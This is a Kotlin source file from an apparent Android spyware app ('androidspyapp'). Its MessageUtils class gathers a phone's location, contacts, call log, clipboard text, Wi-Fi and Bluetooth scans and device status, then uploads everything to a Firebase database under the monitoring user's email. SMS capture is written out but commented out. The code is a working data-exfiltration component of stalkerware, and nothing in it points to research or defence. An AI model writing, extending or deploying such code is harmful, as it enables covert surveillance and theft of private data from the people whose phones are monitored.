package com.komnacki.androidspyapp.results

import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.util.Log
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import com.komnacki.androidspyapp.calllog.CalllogState
import com.komnacki.androidspyapp.contacts.ContactsState
import com.komnacki.androidspyapp.device.battery.BatteryState
import com.komnacki.androidspyapp.device.bluetooth.BluetoothState
import com.komnacki.androidspyapp.device.config.ConfigState
import com.komnacki.androidspyapp.device.device.DeviceState
import com.komnacki.androidspyapp.device.location.LocationState
import com.komnacki.androidspyapp.device.memory.MemoryState
import com.komnacki.androidspyapp.device.network.NetworkState
import com.komnacki.androidspyapp.device.nfc.NFCState
import com.komnacki.androidspyapp.sms.SmsState
import java.text.SimpleDateFormat
import java.util.*

class MessageUtils {
    private val DATABASE_SEPARATOR = "/"
    private val BATTERY_DATABASE_TAG = "BATTERY"
    private val BLUETOOTH_DATABASE_TAG = "BLUETOOTH"
    private val CONFIG_DATABASE_TAG = "CONFIG"
    private val NETWORK_DATABASE_TAG = "NETWORK"
    private val MEMORY_DATABASE_TAG = "MEMORY"
    private val DEVICE_DATABASE_TAG = "DEVICE"
    private val NFC_DATABASE_TAG = "NFC"
    private val LOCATION_DATABASE_TAG = "LOCATION"
    private val SMS_DATABASE_TAG = "SMS"
    private val CONTACTS_DATABASE_TAG = "CONTACTS"
    private val CALLLOG_DATABASE_TAG = "CALL_LOG"
    private val WIFI_LIST_DATABASE_TAG = "WIFI_LIST"
    private val WIFI_LIST_DATABASE_TAG_EMPTY = "WIFI_LIST/Empty"
    private val BLUETOOTH_LIST_DATABASE_TAG = "BLUETOOTH_LIST"
    private val BLUETOOTH_LIST_DATABASE_TAG_EMPTY = "BLUETOOTH_LIST/Empty"
    private val CLIPBOARD_DATABASE_TAG = "CLIPBOARD/VALUE"
    private val SHARED_PREFERENCE_TAG: String = "SHARED_PREFERENCE_NAME"

    private val dateFormat = "yyyy-MM-dd"
    private val timeFormat = "HH:mm:ss"

    enum class StateChange {
        CHANGED, NOT_CHANGED
    }

    companion object {
        lateinit var userEmail: String
        lateinit var context: Context
        fun getInstance(context: Context, userEmail: String): MessageUtils {
            Companion.context = context
            Companion.userEmail = userEmail
            return MessageUtils()
        }
    }

    fun sendData(
        bluetoothName: String,
        wifiScanResult: List<WifiScanResult>?,
        bluetoothScanResult: List<BluetoothScanResult>?,
        prefsCalls: String
    ) {
        val locationState = LocationState(context)
        //val smsState = SmsState(context)
        val contactsState = ContactsState(context)
        val calllogState = CalllogState(context, prefsCalls)
        val values = mutableMapOf<String, Any>()
        locationState.getData().forEach { item ->
            values[LOCATION_DATABASE_TAG + DATABASE_SEPARATOR + item.key] = item.value
        }
//        smsState.getData().forEach { item ->
//            values[SMS_DATABASE_TAG + DATABASE_SEPARATOR + item.key] = item.value
//        }
        contactsState.getData().forEach { item ->
            values[CONTACTS_DATABASE_TAG + DATABASE_SEPARATOR + item.key] = item.value
        }
        calllogState.getData().forEach { item ->
            values[CALLLOG_DATABASE_TAG + DATABASE_SEPARATOR + item.key] = item.value
        }
        val currDate = SimpleDateFormat(dateFormat, Locale.getDefault()).format(Date())
        val currTime = SimpleDateFormat(timeFormat, Locale.getDefault()).format(Date())
        val referency = FirebaseDatabase.getInstance().reference.child(userEmail.replace(".","_")).child(currDate).child(currTime)
        sendtoFirebase(values, referency)
        sendStatuPhone(bluetoothName, wifiScanResult, bluetoothScanResult)
    }

    private fun sendtoFirebase(values: MutableMap<String, Any>, referency: DatabaseReference){
        sendClipboardContent(values)
        referency.updateChildren(values)
            .addOnSuccessListener {
                Log.i("KK: ", "Data updated complete")
            }
            .addOnFailureListener { exception ->
                sendErrorLog(exception.message.toString())
            }
            .addOnCompleteListener {
                Log.i("KK: ", "Data updated complete")
            }
    }

    public fun sendErrorLog(error: String){
        val values = mutableMapOf<String, Any>()
        val currDate = SimpleDateFormat(dateFormat, Locale.getDefault()).format(Date())
        val currTime = SimpleDateFormat(timeFormat, Locale.getDefault()).format(Date())
        val referency = FirebaseDatabase.getInstance().reference.child(userEmail.replace(".","_")).child("Errors").child(currDate).child(currTime)
        values["Error"] = error
        sendtoFirebase(values, referency)
    }

    private fun sendStatuPhone(bluetoothName: String, wifiScanResult: List<WifiScanResult>?, bluetoothScanResult: List<BluetoothScanResult>?){
        val values = mutableMapOf<String, Any>()
        val batteryState = BatteryState(context)
        val bluetoothState = BluetoothState(context, bluetoothName)
        val configState = ConfigState(context)
        val networkState = NetworkState(context)
        val memoryState = MemoryState(context)
        val deviceState = DeviceState(context)
        val nfcState = NFCState(context)
        batteryState.getData().forEach { item ->
            values[BATTERY_DATABASE_TAG + DATABASE_SEPARATOR + item.key] = item.value
        }
        bluetoothState.getData().forEach { item ->
            values[BLUETOOTH_DATABASE_TAG + DATABASE_SEPARATOR + item.key] = item.value
        }
        configState.getData().forEach { item ->
            values[CONFIG_DATABASE_TAG + DATABASE_SEPARATOR + item.key] = item.value
        }
        networkState.getData().forEach { item ->
            values[NETWORK_DATABASE_TAG + DATABASE_SEPARATOR + item.key] = item.value
        }
        memoryState.getData().forEach { item ->
            values[MEMORY_DATABASE_TAG + DATABASE_SEPARATOR + item.key] = item.value
        }
        deviceState.getData().forEach { item ->
            values[DEVICE_DATABASE_TAG + DATABASE_SEPARATOR + item.key] = item.value
        }
        nfcState.getData().forEach { item ->
            values[NFC_DATABASE_TAG + DATABASE_SEPARATOR + item.key] = item.value
        }
        if (!wifiScanResult.isNullOrEmpty()) {
            wifiScanResult.forEach { scan ->
                val wifiNetwork = scan.getData()
                wifiNetwork.forEach { item ->
                    values[WIFI_LIST_DATABASE_TAG +
                            DATABASE_SEPARATOR +
                            normalizeName(scan.getWifiName()) +
                            DATABASE_SEPARATOR +
                            normalizeName(item.key)] = item.value
                }
            }
        } else {
            values[WIFI_LIST_DATABASE_TAG_EMPTY] = ""
        }
        if (!bluetoothScanResult.isNullOrEmpty()) {
            bluetoothScanResult.forEach { scan ->
                val bluetoothNetwork = scan.getData()
                bluetoothNetwork.forEach { item ->
                    values[BLUETOOTH_LIST_DATABASE_TAG +
                            DATABASE_SEPARATOR +
                            normalizeName(scan.getBluetoothName()) +
                            DATABASE_SEPARATOR +
                            normalizeName(item.key)] = item.value
                }
            }
        } else {
            values[BLUETOOTH_LIST_DATABASE_TAG_EMPTY] = ""
        }
        val referency = FirebaseDatabase.getInstance().reference.child(userEmail.replace(".","_")).child("StatusPhone")
        sendtoFirebase(values, referency)
    }

    private fun sendClipboardContent(values: MutableMap<String, Any>) {
        try {
            (context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager).primaryClip?.let {
                val item: ClipData.Item = it.getItemAt(0)
                if (!item.text.toString().isBlank()) {
                    values[CLIPBOARD_DATABASE_TAG] = item.text.toString()
                }
            }
        } catch (e: Exception) {
            Log.e("KK: ", "ERROR: ${e.message}, ${e.cause}")
        }
    }

    private fun normalizeName(name: String): String {
        return name
            .replace("/", " ")
            .replace("#", " ")
            .replace("\\", " ")
            .replace(",", " ")
            .replace(".", " ")
            .replace("(", " ")
            .replace(")", " ")
            .replace("!", " ")
            .replace("[", " ")
            .replace("]", " ")
            .replace(" ", "_")
    }
}